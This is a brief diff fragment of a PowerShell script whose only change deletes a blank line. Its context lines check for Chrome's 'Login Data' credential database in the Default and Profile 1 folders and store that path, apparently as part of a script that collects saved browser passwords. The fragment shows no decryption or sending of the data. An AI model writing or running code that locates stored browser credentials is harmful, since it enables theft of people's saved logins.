@@ -22,7 +22,6 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\
 	
 }
 
-
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
 {
 	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
